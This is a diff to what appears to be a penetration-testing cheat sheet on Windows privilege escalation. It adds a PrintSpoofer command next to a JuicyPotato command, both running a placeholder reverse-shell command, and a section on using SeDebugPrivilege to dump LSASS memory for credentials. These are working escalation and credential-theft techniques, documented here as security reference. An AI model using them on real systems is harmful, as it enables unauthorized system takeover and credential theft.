@@ -20,9 +20,11 @@ Privileges are [listed and explained here](https://learn.microsoft.com/en-us/win
 
 <hr class="sep-both">
 
-## Privilege2Root
+## Privilege2Admin
 
 <div class="row row-cols-lg-2"><div>
+
+You may use these as a normal user to escalate to admin or system, and as admin to escalate to system.
 
 #### SeImpersonate — steal access tokens
  
@@ -33,10 +35,30 @@ PS> # You can pick any port for -l. It's for DCOM traffic.
 PS> .\JuicyPotato.exe -l any_port -p c:\windows\system32\cmd.exe -a "/c <reverse shell command>" -t *
 ````
 
+You can use [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) <small>(1.7k ⭐, 2020 🪦)</small>:
+
+````ps
+PS> .\PrintSpoofer.exe -c "<reverse shell command>"
+````
+
 Additional references:
 
 * [RogueWinRM](https://github.com/antonioCoco/RogueWinRM) <small>(0.5k ⭐, 2020 🪦)</small> using [WinRM](/operating-systems/networking/protocols/winrm.md)
 * [token-priv](https://github.com/hatRiot/token-priv/tree/master) <small>(0.7k ⭐, 2017 🪦)</small>
+</div><div>
+</div></div>
+
+<hr class="sep-both">
+
+## Admin2System
+
+<div class="row row-cols-lg-2"><div>
+
+You may use these as an admin to escalate system.
+
+#### SeDebugPrivilege — Dump Process Memory
+
+We can use methods shown in [Dump Credentials From LSASS Process](/operating-systems/windows/security/index.md#dump-credentials-from-lsass-process) to dump a process memory, which is often LSASS.
 </div><div>
 </div></div>
 
